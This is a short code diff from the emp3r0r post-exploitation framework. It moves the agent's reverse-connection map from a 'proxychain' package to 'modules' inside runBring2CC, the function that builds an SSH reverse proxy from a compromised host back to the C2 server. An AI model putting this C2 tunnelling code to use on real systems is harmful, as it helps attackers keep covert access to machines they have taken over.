@@ -16,7 +16,6 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/c2transport"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/common"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/modules"
-	"github.com/jm33-m0/emp3r0r/core/internal/agent/proxychain"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/ssh"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/internal/transport"
@@ -110,7 +109,7 @@ func runBring2CC(cmd *cobra.Command, args []string) {
 		c2transport.C2RespPrintf(cmd, "Error: We don't have any internet to share\n")
 		return
 	}
-	for p, cancelfunc := range proxychain.ReverseConns {
+	for p, cancelfunc := range modules.ReverseConns {
 		if addr == p {
 			cancelfunc()
 		}
@@ -130,7 +129,7 @@ func runBring2CC(cmd *cobra.Command, args []string) {
 		cancel()
 		return
 	}
-	err = transport.SSHReverseProxyClient(targetAddrWithPort, common.RuntimeConfig.Password, proxyPort, &proxychain.ReverseConns, def.ProxyServer, ctx, cancel)
+	err = transport.SSHReverseProxyClient(targetAddrWithPort, common.RuntimeConfig.Password, proxyPort, &modules.ReverseConns, def.ProxyServer, ctx, cancel)
 	if err != nil {
 		c2transport.C2RespPrintf(cmd, "%v\n", err)
 		return
